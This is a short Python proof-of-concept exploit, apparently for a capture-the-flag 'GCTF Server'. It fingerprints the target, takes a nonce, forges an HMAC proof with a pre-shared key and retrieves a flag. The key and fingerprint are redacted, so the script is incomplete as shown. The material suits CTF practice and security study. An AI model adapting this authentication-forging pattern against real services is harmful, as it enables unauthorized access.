#!/usr/bin/env python3
r"""
  ____  ____ _____ _____ _         __ _
 / ___|/ ___|_   _|  ___| |_ ___  / _| | __ _  __ _
| |  _| |     | | | |_  | __/ _ \| |_| |/ _` |/ _` |
| |_| | |___  | | |  _| | || (_) |  _| | (_| | (_| |
 \____|\____| |_| |_|    \__\___/|_| |_|\__,_|\__, |
                                              |___/
GCTFtoflag - one-shot flag extraction for GCTF Server

Only GCTF Servers are vulnerable. Point it at the wrong box and it refuses.

Usage:
    python3 poc.py <ip> <port>

Example:
    python3 poc.py 203.0.113.10 8080
"""
import hashlib
import hmac
import json
import sys
import urllib.error
import urllib.request

FINGERPRINT = "REDACTED"  # not publishing this
PSK = b"REDACTED"  # or this
TIMEOUT = 10


def request(url, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, headers={"User-Agent": "GCTFtoflag/1.0"})
    if data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read()


def main():
    if len(sys.argv) != 3 or not sys.argv[2].isdigit():
        print(__doc__)
        sys.exit(1)

    ip, port = sys.argv[1], int(sys.argv[2])
    target = f"http://{ip}:{port}"

    print(f"[*] Target: {target}")
    try:
        _, headers, _ = request(target + "/")
    except Exception as e:
        print(f"[-] Could not connect: {e}")
        sys.exit(1)

    server = headers.get("Server", "")
    if not server.startswith(FINGERPRINT):
        print(f"[-] Server: {server or '(none)'}")
        print("[-] Not a GCTF Server. Target is not vulnerable.")
        sys.exit(1)
    print(f"[+] Server: {server} -> vulnerable!")

    status, _, body = request(target + "/gctf/hello")
    if status != 200:
        print(f"[-] Handshake failed ({status})")
        sys.exit(1)
    nonce = json.loads(body)["nonce"]
    print(f"[*] Got nonce {nonce}")

    proof = hmac.new(PSK, nonce.encode(), hashlib.sha256).hexdigest()
    status, _, body = request(target + "/gctf/toflag", {"nonce": nonce, "proof": proof})
    if status != 200:
        print(f"[-] Exploit failed ({status}): {body.decode(errors='replace')}")
        sys.exit(1)

    print(f"[+] Flag: {json.loads(body)['flag']}")


if __name__ == "__main__":
    main()
